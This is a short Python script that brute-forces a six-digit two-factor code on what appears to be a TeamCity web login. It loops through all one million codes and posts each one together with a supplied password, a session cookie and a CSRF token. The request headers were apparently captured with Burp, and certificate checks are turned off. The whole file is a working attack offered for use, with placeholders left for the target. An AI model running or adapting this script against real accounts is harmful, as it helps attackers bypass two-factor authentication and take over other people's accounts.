# BruteForce6DigitOTP.py
# this is painfully slow...

import requests

username = "add the user name her"
password = "add the password here"
target_url = "add the target url here"
tc_session_id = "add the tcsessionid here"
tc_csrf_token = "add the tc-csrf-token here"

found_otp = None

# Brute force the OTP
for i in range(1000000):
    otp_str = str(i).zfill(6)
    data = {
        "username": username,
        "password": password,
        "otp": otp_str
    }
    headers = {     # I captured all of the below header information with Burp
        "Host": "example.xxx",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://xxx.xxx.xxx/2fa.html", # you need to add the referer url here, I used Burp to capture it.
        "X-Requested-With": "XMLHttpRequest",
        "X-Teamcity-Client": "Web UI",
        "X-Tc-Csrf-Token": tc_csrf_token,
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://xxx.xxx",   # modify with your Origin; I captured mine from Burp
        "Dnt": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Cookie": f"TCSESSIONID={tc_session_id}; __test=1"
    }
    response = requests.post(target_url, data=data, headers=headers, verify=False)

    if response.status_code == 302:
        found_otp = otp_str
        print(f"Successful login with OTP: {otp_str}")
    elif response.status_code == 200:
        print(f"Unsuccessful login with OTP: {otp_str}")

if found_otp:
    print(f"\nLast successful OTP: {found_otp}")
else:
    print("\nNo valid OTP found.")

print("\nBrute force complete.")
